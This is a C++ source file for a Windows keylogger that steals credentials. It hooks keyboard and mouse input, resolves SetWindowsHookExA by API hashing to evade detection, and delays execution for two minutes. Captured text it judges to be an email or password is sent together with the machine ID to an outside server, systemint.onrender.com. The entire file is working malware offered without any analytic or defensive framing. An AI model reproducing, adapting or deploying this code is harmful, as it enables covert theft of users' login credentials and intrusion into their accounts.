#include <windows.h>
#include <winhttp.h>
#include <psapi.h>
#include <string>
#include <regex>
#include <vector>

#pragma comment(lib, "winhttp.lib")

// --- 1. API HASHING & STRINGS ---
constexpr DWORD HashString(const char* str) {
    DWORD hash = 0x811c9dc5;
    while (*str) { hash ^= (BYTE)*str++; hash *= 0x01000193; }
    return hash;
}

FARPROC GetProcAddressH(HMODULE hMod, DWORD targetHash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)hMod + exports->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)hMod + exports->AddressOfNameOrdinals);
    DWORD* functs = (DWORD*)((BYTE*)hMod + exports->AddressOfFunctions);
    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        if (HashString((const char*)((BYTE*)hMod + names[i])) == targetHash)
            return (FARPROC)((BYTE*)hMod + functs[ordinals[i]]);
    }
    return NULL;
}

// --- 2. DATA UTILS ---
std::string GetMachineId() {
    HW_PROFILE_INFOA hw;
    return GetCurrentHwProfileA(&hw) ? std::string(hw.szHwProfileGuid) : "{000-000}";
}

bool IsEmail(const std::string& s) {
    return std::regex_match(s, std::regex(R"((\w+)(\.|_)?(\w*)@(\w+)(\.(\w+))+)"));
}

bool IsValidPass(const std::string& s) {
    // Regex for: Min 8 chars, at least one letter and one number
    return std::regex_match(s, std::regex(R"(^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$)\n"));
}

// --- 3. EXFILTRATION ---
void UploadData(std::string email, std::string pass) {
    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", 1, NULL, NULL, 0);
    HINTERNET hC = WinHttpConnect(hS, L"systemint.onrender.com", 443, 0);
    HINTERNET hR = WinHttpOpenRequest(hC, L"POST", L"/api/sync", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    
    std::string json = "{\"machineId\":\"" + GetMachineId() + "\", \"email\":\"" + email + "\", \"password\":\"" + pass + "\"}";
    WinHttpSendRequest(hR, L"Content-Type: application/json\r\n", -1, (LPVOID)json.c_str(), json.length(), json.length(), 0);
    WinHttpReceiveResponse(hR, NULL);
    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
}

// --- 4. HOOKS & LOGIC ---
std::string buffer = "";
std::string savedEmail = "";
std::string savedPass = "";

void ProcessBuffer() {
    if (buffer.empty()) return;
    if (IsEmail(buffer)) savedEmail = buffer;
    else if (IsValidPass(buffer) || buffer.length() >= 8) savedPass = buffer;
    
    if (!savedPass.empty()) {
        UploadData(savedEmail, savedPass);
        savedEmail.clear(); savedPass.clear();
    }
    buffer.clear();
}

LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;
        if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) ProcessBuffer();
        else if (k->vkCode >= 0x30 && k->vkCode <= 0x5A) buffer += (char)k->vkCode;
        else if (k->vkCode == VK_SPACE) buffer += " ";
    }
    return CallNextHookEx(NULL, n, w, l);
}

LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_LBUTTONDOWN) ProcessBuffer(); // User clicked away/button
    return CallNextHookEx(NULL, n, w, l);
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
    // JUNK_HERE
    Sleep(120000);

    HMODULE u32 = GetModuleHandleA("user32.dll");
    // Hash for SetWindowsHookExA = 0xDE2B4659
    auto _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddressH(u32, 0xDE2B4659);

    _SetHook(WH_KEYBOARD_LL, KeyProc, GetModuleHandle(NULL), 0);
    _SetHook(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
    return 0;
}
